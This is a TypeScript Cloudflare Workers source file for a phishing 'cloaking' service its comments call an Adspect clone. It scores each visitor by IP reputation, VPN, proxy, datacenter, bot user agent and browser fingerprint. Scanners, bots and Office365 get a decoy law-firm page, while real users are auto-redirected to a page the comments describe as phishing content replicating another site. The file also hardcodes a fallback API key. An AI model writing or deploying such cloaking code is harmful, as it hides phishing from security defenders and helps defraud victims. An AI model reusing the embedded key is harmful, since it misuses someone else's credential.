import { Hono } from 'hono'
import { cors } from 'hono/cors'
import { serveStatic } from 'hono/cloudflare-workers'
import { detectIP } from './detection/ip-detection'
import { analyzeFingerprintData } from './detection/fingerprint'
import { analyzeTCPHeaders } from './detection/tcp-analysis'
import { calculateRiskScore, logDetection, getDecisionExplanation } from './detection/scoring'
import type { FingerprintData } from './detection/fingerprint'

export type Bindings = {
  IPQS_API_KEY: string  // IPQualityScore API key
  PDF_CACHE?: KVNamespace
  INVOICE_IMAGE_CACHE?: KVNamespace
  OAUTH_TOKENS?: KVNamespace
  DB?: D1Database
}

const app = new Hono<{ Bindings: Bindings }>()

// Enable CORS for API routes
app.use('/api/*', cors())

// Serve static files
app.use('/static/*', serveStatic({ root: './public' }))

// ========================================
// ADSPECT CLONE - MAIN CLOAKING ROUTE
// ========================================
app.get('/', async (c) => {
  try {
    // Get client IP
    const clientIP = c.req.header('CF-Connecting-IP') || 
                    c.req.header('X-Forwarded-For')?.split(',')[0].trim() || 
                    'unknown';

    // Get User-Agent
    const userAgent = c.req.header('User-Agent') || '';

    // Get API key from environment
    const apiKey = c.env.IPQS_API_KEY || 'OEs7qclOHgnGkQcXn29fcqGHh8v6Eepd';
    
    console.log(`[API KEY CHECK] Using key: ${apiKey.substring(0, 10)}...`);
    console.log(`[API KEY CHECK] From env: ${c.env.IPQS_API_KEY ? 'YES' : 'NO (using fallback)'}`);

    console.log(`[DETECTION START] IP: ${clientIP}, UA: ${userAgent.substring(0, 50)}...`);

    // Layer 1: IP Detection (Using Cloudflare threat intelligence + manual blocklist)
    const cfProperties = c.req.raw.cf; // Cloudflare request properties
    
    // Log Cloudflare properties for debugging
    console.log('[CLOUDFLARE DATA]', {
      ip: clientIP,
      country: cfProperties?.country,
      asn: cfProperties?.asn,
      asn_org: cfProperties?.asn_org,
      threat_score: cfProperties?.threat_score,
      colo: cfProperties?.colo,
      city: cfProperties?.city
    });
    
    const ipDetection = await detectIP(clientIP, cfProperties);
    console.log('[IP DETECTION]', {
      isVPN: ipDetection.isVPN,
      isProxy: ipDetection.isProxy,
      isDatacenter: ipDetection.isDatacenter,
      isBot: ipDetection.isBot,
      fraudScore: ipDetection.fraudScore,
      riskScore: ipDetection.riskScore
    });

    // Layer 2: TCP/IP Analysis
    const tcpAnalysis = analyzeTCPHeaders(c.req.raw);
    console.log('[TCP ANALYSIS]', {
      isBotUA: tcpAnalysis.isBotUserAgent,
      suspicious: tcpAnalysis.hasSuspiciousHeaders,
      riskScore: tcpAnalysis.riskScore,
      signals: tcpAnalysis.signals
    });

    // Calculate risk score (without JS fingerprint for now)
    const riskScore = calculateRiskScore({
      ip: ipDetection,
      tcp: tcpAnalysis
    });

    console.log('[RISK SCORE]', {
      total: riskScore.total,
      decision: riskScore.decision,
      confidence: riskScore.confidence,
      breakdown: riskScore.breakdown
    });

    // Log detection
    logDetection({ ip: ipDetection, tcp: tcpAnalysis }, riskScore, clientIP, userAgent);

    // DEBUG: Return JSON for debugging
    // REMOVE THIS AFTER TESTING
    if (c.req.query('debug') === 'true') {
      return c.json({
        ip: clientIP,
        userAgent: userAgent.substring(0, 100),
        cloudflare: {
          country: cfProperties?.country,
          asn: cfProperties?.asn,
          asn_org: cfProperties?.asn_org,
          threat_score: cfProperties?.threat_score,
          colo: cfProperties?.colo,
          city: cfProperties?.city
        },
        detection: {
          isVPN: ipDetection.isVPN,
          isProxy: ipDetection.isProxy,
          isDatacenter: ipDetection.isDatacenter,
          isBot: ipDetection.isBot,
          isTor: ipDetection.isTor,
          fraudScore: ipDetection.fraudScore,
          isp: ipDetection.isp,
          organization: ipDetection.organization,
          connectionType: ipDetection.connectionType
        },
        riskScore: {
          total: riskScore.total,
          decision: riskScore.decision,
          confidence: riskScore.confidence,
          breakdown: riskScore.breakdown
        },
        decision: (ipDetection.isVPN || ipDetection.isProxy || ipDetection.isTor || 
                   ipDetection.fraudScore >= 75 || riskScore.decision === 'block' || 
                   riskScore.total >= 35) ? 'BLOCK' : 'ALLOW'
      });
    }

    // PRODUCTION MODE - STRICT BLOCKING (like billtrust.cam)
    // Block ANYTHING suspicious - only allow clean residential IPs
    
    const shouldBlock = 
      ipDetection.isVPN ||           // Block ALL VPN
      ipDetection.isProxy ||         // Block ALL Proxy
      ipDetection.isTor ||           // Block ALL Tor
      ipDetection.isDatacenter ||    // Block ALL Datacenters
      ipDetection.fraudScore >= 50 || // Block high fraud score
      tcpAnalysis.isRDP ||           // Block ALL RDP
      tcpAnalysis.isCloudProvider || // Block ALL Cloud/VPS
      tcpAnalysis.isBotUserAgent ||  // Block ALL Bots
      riskScore.total >= 25 ||       // VERY strict threshold
      riskScore.decision === 'block';

    if (shouldBlock) {
      console.log('⛔ BLOCKED - Showing innocent legal page (NO redirect)');
      console.log('Block reasons:', {
        isVPN: ipDetection.isVPN,
        isProxy: ipDetection.isProxy,
        isTor: ipDetection.isTor,
        isDatacenter: ipDetection.isDatacenter,
        isRDP: tcpAnalysis.isRDP,
        isCloudProvider: tcpAnalysis.isCloudProvider,
        isBotUA: tcpAnalysis.isBotUserAgent,
        fraudScore: ipDetection.fraudScore,
        riskTotal: riskScore.total
      });
      
      // Show innocent "Legal Zahirco" page WITHOUT redirect - just like billtrust.cam
      // Office365/Bots see professional legal services (innocent content)
      return c.html(await generateInnocentPage());
    } else {
      console.log('✅ ALLOWED - Showing landing page WITH redirect to phishing');
      // Real user - show landing page that redirects to Inv.html (phishing content)
      return c.html(await generateLandingPage());
    }

  } catch (error) {
    console.error('[DETECTION ERROR]', error);
    // On error, show safe page (fail-safe)
    return c.html(await generateFallbackSafePage());
  }
});

// ========================================
// FINGERPRINT COLLECTION ENDPOINT
// ========================================
app.post('/api/fingerprint', async (c) => {
  try {
    const fingerprintData = await c.req.json() as FingerprintData;
    
    // Analyze fingerprint
    const fingerprintResult = analyzeFingerprintData(fingerprintData);
    
    console.log('[FINGERPRINT]', {
      isHeadless: fingerprintResult.isHeadless,
      isAutomation: fingerprintResult.isAutomation,
      riskScore: fingerprintResult.riskScore,
      signals: fingerprintResult.signals
    });

    return c.json({ 
      success: true,
      riskScore: fingerprintResult.riskScore,
      isHeadless: fingerprintResult.isHeadless,
      isAutomation: fingerprintResult.isAutomation
    });
  } catch (error) {
    console.error('[FINGERPRINT ERROR]', error);
    return c.json({ success: false, error: 'Failed to process fingerprint' }, 500);
  }
});

// ========================================
// HELPER FUNCTIONS
// ========================================

// Generate innocent legal services page for bots/scanners (NO REDIRECT)
async function generateInnocentPage(): Promise<string> {
  // Shows professional legal services content - exactly like billtrust.cam
  // Office365/Bots/VPN see this (innocent content, no phishing)
  
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Legal Zahirco - Professional Legal Services</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto Condensed', Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        header {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            color: white;
            padding: 60px 20px;
            text-align: center;
        }
        h1 {
            font-size: 3em;
            font-weight: 700;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }
        .subtitle {
            font-size: 1.3em;
            font-weight: 300;
            opacity: 0.9;
        }
        .content {
            background: white;
            padding: 60px 40px;
            margin: 40px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h2 {
            font-size: 2em;
            margin-bottom: 20px;
            color: #1a1a1a;
        }
        p {
            font-size: 1.1em;
            margin-bottom: 20px;
            color: #555;
        }
        .services {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin: 40px 0;
        }
        .service-card {
            background: #f9f9f9;
            padding: 30px;
            border-radius: 8px;
            border-left: 4px solid #1a1a1a;
        }
        .service-card h3 {
            font-size: 1.5em;
            margin-bottom: 15px;
            color: #1a1a1a;
        }
        footer {
            text-align: center;
            padding: 40px 20px;
            background: #1a1a1a;
            color: white;
            margin-top: 60px;
        }
    </style>
</head>
<body>
    <header>
        <h1>LEGAL ZAHIRCO</h1>
        <p class="subtitle">Professional Legal Services - Expertise You Can Trust</p>
    </header>
    
    <div class="container">
        <div class="content">
            <h2>Welcome to Legal Zahirco</h2>
            <p>
                At Legal Zahirco, we provide comprehensive legal services tailored to meet your unique needs. 
                Our team of experienced attorneys is dedicated to delivering exceptional results with 
                professionalism and integrity.
            </p>
            
            <div class="services">
                <div class="service-card">
                    <h3>Corporate Law</h3>
                    <p>Expert guidance for business formation, contracts, and compliance.</p>
                </div>
                <div class="service-card">
                    <h3>Civil Litigation</h3>
                    <p>Strong representation in disputes and court proceedings.</p>
                </div>
                <div class="service-card">
                    <h3>Real Estate Law</h3>
                    <p>Comprehensive support for property transactions and disputes.</p>
                </div>
                <div class="service-card">
                    <h3>Family Law</h3>
                    <p>Compassionate assistance with divorce, custody, and family matters.</p>
                </div>
            </div>
            
            <h2>Why Choose Us</h2>
            <p>
                With over 20 years of combined experience, our attorneys have successfully represented 
                clients in a wide range of legal matters. We pride ourselves on our attention to detail, 
                personalized service, and commitment to achieving the best possible outcomes for our clients.
            </p>
            
            <p>
                Contact us today to schedule a consultation and discover how we can help protect your 
                interests and achieve your legal goals.
            </p>
        </div>
    </div>
    
    <footer>
        <p>&copy; 2024 Legal Zahirco. All rights reserved.</p>
        <p>Professional Legal Services | Confidential Consultations Available</p>
    </footer>
    
    <!-- NO redirect script - bots/scanners stay here -->
    <!-- NO fingerprinting - keeps the page clean and innocent -->
</body>
</html>
  `;
}

async function generateLandingPage(): Promise<string> {
  // This will load the actual index.html file with billtrust.cam replica
  // Plus inject fingerprinting script + auto-redirect logic
  
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Legal Zahirco - Professional Legal Services</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto Condensed', Arial, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        header {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            color: white;
            padding: 60px 20px;
            text-align: center;
        }
        h1 {
            font-size: 3em;
            font-weight: 700;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }
        .subtitle {
            font-size: 1.3em;
            font-weight: 300;
            opacity: 0.9;
        }
        .content {
            background: white;
            padding: 60px 40px;
            margin: 40px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .loading {
            text-align: center;
            padding: 40px;
            font-size: 1.2em;
            color: #666;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #333;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <header>
        <h1>LEGAL ZAHIRCO</h1>
        <p class="subtitle">Experimental typography, dark color palette, and focus on large-scale imagery</p>
    </header>
    
    <div class="container">
        <div class="content">
            <div class="loading">
                <div class="spinner"></div>
                <p>Verifying your connection...</p>
            </div>
        </div>
    </div>

    <script>
    ${getClientFingerprintScript()}
    
    // Auto-redirect after fingerprint collection
    setTimeout(() => {
        window.location.href = '/Inv.html';
    }, 2000);
    </script>
</body>
</html>
  `;
}

async function generateSafePage(ipDetection: any, riskScore: any): Promise<string> {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Denied - Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            font-size: 64px;
            text-align: center;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 16px;
            text-align: center;
        }
        .message {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 24px;
            text-align: center;
        }
        .details {
            background: #f5f5f5;
            border-radius: 8px;
            padding: 20px;
            font-size: 14px;
            color: #666;
            margin-top: 20px;
        }
        .detail-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #e0e0e0;
        }
        .detail-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        .label {
            font-weight: 600;
            color: #333;
        }
        .value {
            color: #666;
            text-align: right;
        }
        .warning {
            color: #d32f2f;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🛡️</div>
        <h1>Access Restricted</h1>
        <p class="message">
            Our security system has detected unusual activity from your connection.
            Access has been temporarily restricted to protect our services.
        </p>
        
        <div class="details">
            <div class="detail-row">
                <span class="label">Risk Score:</span>
                <span class="value warning">${riskScore.total}/100</span>
            </div>
            <div class="detail-row">
                <span class="label">VPN Detected:</span>
                <span class="value">${ipDetection.isVPN ? 'Yes' : 'No'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Proxy Detected:</span>
                <span class="value">${ipDetection.isProxy ? 'Yes' : 'No'}</span>
            </div>
            <div class="detail-row">
                <span class="label">Datacenter IP:</span>
                <span class="value">${ipDetection.isDatacenter ? 'Yes' : 'No'}</span>
            </div>
            <div class="detail-row">
                <span class="label">ISP:</span>
                <span class="value">${ipDetection.isp}</span>
            </div>
            <div class="detail-row">
                <span class="label">Organization:</span>
                <span class="value">${ipDetection.organization}</span>
            </div>
        </div>
        
        <p class="message" style="margin-top: 24px; font-size: 14px;">
            If you believe this is an error, please contact support or try again from a different network.
        </p>
    </div>
</body>
</html>
  `;
}

async function generateFallbackSafePage(): Promise<string> {
  return `
<!DOCTYPE html>
<html>
<head>
    <title>Service Temporarily Unavailable</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Arial; text-align: center; padding: 50px;">
    <h1>Service Temporarily Unavailable</h1>
    <p>Please try again later.</p>
</body>
</html>
  `;
}

function getClientFingerprintScript(): string {
  return `
// Client-side fingerprinting
(function() {
  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (!ctx) return 'no-canvas';
      canvas.width = 200;
      canvas.height = 50;
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('IPQS Canvas', 2, 15);
      return canvas.toDataURL().substring(0, 100);
    } catch (e) {
      return 'error';
    }
  }

  function getWebGLFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (!gl) return 'no-webgl';
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (!debugInfo) return 'no-debug';
      return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    } catch (e) {
      return 'error';
    }
  }

  const fingerprint = {
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint(),
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1
    },
    navigator: {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookieEnabled: navigator.cookieEnabled
    },
    hardware: {
      cores: navigator.hardwareConcurrency || 0,
      memory: navigator.deviceMemory || null
    },
    webdriver: navigator.webdriver || false,
    plugins: navigator.plugins.length
  };

  fetch('/api/fingerprint', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(fingerprint)
  }).catch(() => {});
})();
  `;
}

export default app
